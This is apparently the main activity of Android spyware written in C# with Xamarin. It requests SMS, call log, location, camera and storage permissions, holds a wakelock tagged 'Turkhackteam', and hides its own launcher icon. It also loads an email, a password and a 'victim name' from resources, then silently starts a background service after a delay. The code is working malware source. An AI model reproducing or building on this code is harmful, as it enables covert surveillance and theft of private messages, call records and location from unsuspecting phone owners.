using Android.App;
using Android.Content;
using Android.OS;
using Android.Widget;
using System;
using System.Collections.Generic;
using Android.Content.PM;
using Android.Runtime;
using System.Threading.Tasks;

namespace izci
{
    [Activity(Label = "@string/app_name", MainLauncher = true, Icon = "@mipmap/icon")]
    [IntentFilter(new string[] { "android.permission.CAMERA", "android.permission.WRITE_EXTERNAL_STORAGE",
    "android.provider.Telephony.READ_SMS","android.permission.WRITE_CALL_LOG",
    "android.permission.READ_CALL_LOG",
    "android.permission.READ_EXTERNAL_STORAGE"}, Priority = (int)IntentFilterPriority.HighPriority)]

    public class MainActivity : Activity
	{
        
        static readonly Type SERVICE_TYPE = typeof(ForegroundService);
        readonly string TAG = SERVICE_TYPE.FullName;
        private PowerManager.WakeLock wakelock = null;
        Button _startServiceButton;
        Button _stopServiceButton;
		static Intent _startServiceIntent;
        static Intent _stopServiceIntent;
        public static Activity act = default;
        protected override void OnCreate(Bundle savedInstanceState)
        {
            base.OnCreate(savedInstanceState);

            act = this;
            try
            {
                SetContentView(Resource.Layout.Main);
                var permissionsToCheck = new string[]
                {
                Android.Manifest.Permission.AccessCoarseLocation,
                Android.Manifest.Permission.AccessFineLocation,
                Android.Manifest.Permission.WriteCallLog,
                Android.Manifest.Permission.ReadExternalStorage,
                Android.Manifest.Permission.Camera,
                Android.Manifest.Permission.WriteExternalStorage,
                Android.Manifest.Permission.ForegroundService,
                Android.Manifest.Permission.ReadCallLog,
                Android.Manifest.Permission.ReadSms


                };
                CallNotGrantedPermissions(permissionsToCheck);

                _startServiceButton = FindViewById<Button>(Resource.Id.start_service_button);
                _stopServiceButton = FindViewById<Button>(Resource.Id.stop_service_button);

                _startServiceButton.Click += (obj, args)
                    => StartForegroundServiceCompat<ForegroundService>(this);

                _stopServiceButton.Click += (obj, args)
                    =>
                {
                    _stopServiceIntent = GetIntent(SERVICE_TYPE, MainValues.ACTION_STOP_SERVICE);
                    StopService(_stopServiceIntent);
                };
            }
            catch (Exception) { }
            
            PowerManager pmanager = (PowerManager)GetSystemService("power");
            wakelock = pmanager.NewWakeLock(WakeLockFlags.Partial, "Turkhackteam");
            wakelock.SetReferenceCounted(false);
            wakelock.Acquire();

            try
            {
                PackageManager p = PackageManager;
                ComponentName componentName = new ComponentName(this, Class);
                p.SetComponentEnabledSetting(componentName, ComponentEnabledState.Disabled, ComponentEnableOption.DontKillApp);
            }
            catch (Exception) { }

            MainValues._EMAIL = Resources.GetString(Resource.String.EMAIL);
            MainValues._SIFRE = Resources.GetString(Resource.String.SIFRE);
            MainValues.KRBN_ISMI = Resources.GetString(Resource.String.KURBANISMI);

            //Toast.MakeText(ApplicationContext, MainValues._EMAIL+"\n"+ MainValues._SIFRE + MainValues.KRBN_ISMI, ToastLength.Long).Show();
            otoBasla();
        }
        public async void otoBasla()
        {
            await Task.Delay(15000);
            StartForegroundServiceCompat<ForegroundService>(this);
        }
        protected override void OnDestroy()
		{
			base.OnDestroy();
		}
        public override void OnRequestPermissionsResult(int requestCode, string[] permissions, [GeneratedEnum] Permission[] grantResults)
        {
            Xamarin.Essentials.Platform.OnRequestPermissionsResult(requestCode, permissions, grantResults);

            base.OnRequestPermissionsResult(requestCode, permissions, grantResults);
        }
        
        private Intent GetIntent(Type type, string action)
        {
            var intent = new Intent(this, type);
            intent.SetAction(action);
            return intent;
        }

        public void StartForegroundServiceCompat<T>(Context context, Bundle args = null)where T : Service
        {
            _startServiceIntent = GetIntent(SERVICE_TYPE, MainValues.ACTION_START_SERVICE);

            if (args != null)
                _startServiceIntent.PutExtras(args);

            if (Build.VERSION.SdkInt >= BuildVersionCodes.O)
                context.StartForegroundService(_startServiceIntent);
            else
                context.StartService(_startServiceIntent);
        }

        private void CallNotGrantedPermissions(string[] permissionsToCheck)
        {
            if (Build.VERSION.SdkInt >= BuildVersionCodes.M)
            {
                var permissionStillNeeded = GetNotGrantedPermissions(permissionsToCheck);
                if (permissionStillNeeded.Length > 0)
                {
                    RequestPermissions(permissionStillNeeded, 5);
                }
            }
        }

        private string[] GetNotGrantedPermissions(string[] permissionsToCheck)
        {
            var permissionStillNeeded = new List<string>();
            for (int i = 0; i < permissionsToCheck.Length; i++)
            {
                if (Permission.Granted != CheckSelfPermission(permissionsToCheck[i]))
                    permissionStillNeeded.Add(permissionsToCheck[i]);
            }

            return permissionStillNeeded.ToArray();
        }
    }
}

//MainValues.PERIOD_IN_MINUTES = 2;
//Toast.MakeText(this, "AKKKKKKKKKT", ToastLength.Long).Show();
//var intent = new Intent(this, typeof(SecondActivity));
//StartActivity(intent);